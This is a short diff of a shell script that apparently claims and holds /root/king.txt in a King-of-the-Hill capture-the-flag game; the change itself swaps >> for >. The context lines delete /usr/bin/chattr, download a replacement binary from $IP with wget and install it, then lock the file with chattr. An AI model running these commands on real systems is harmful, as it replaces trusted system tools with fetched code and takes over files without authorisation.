@@ -26,7 +26,7 @@ rm -rf /usr/bin/chattr
 cd /usr/bin && wget http://$IP/realchattr && mv realchattr chattr && chmod +x chattr
 set write off
 sudo chattr -ai /root/king.txt
-echo "$nick" >> /root/king.txt
+echo "$nick" > /root/king.txt
 sudo chmod 400 /root/king.txt
 sudo chattr +ai /root/king.txt
 set -o noclobber /root/king.txt
